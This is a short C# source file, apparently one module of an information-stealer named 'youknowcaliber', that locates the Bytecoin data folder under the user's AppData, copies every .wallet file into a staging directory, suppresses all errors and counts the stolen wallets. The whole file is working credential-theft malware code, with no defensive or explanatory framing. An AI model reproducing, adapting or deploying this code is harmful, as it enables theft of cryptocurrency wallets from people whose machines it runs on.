﻿using System;
using System.IO;

namespace youknowcaliber
{
	internal class Bytecoin
	{
		public static void BCNcoinStr(string directorypath)
		{
			try
			{
				foreach (FileInfo fileInfo in new DirectoryInfo(Help.AppData + "\\bytecoin").GetFiles())
				{
					Directory.CreateDirectory(directorypath + "\\Wallets\\Bytecoin\\");
					bool flag = fileInfo.Extension.Equals(".wallet");
					if (flag)
					{
						fileInfo.CopyTo(directorypath + "\\Bytecoin\\" + fileInfo.Name);
					}
				}
				Bytecoin.count++;
				Counting.Wallets++;
			}
			catch
			{
			}
		}

		public static int count = 0;
	}
}
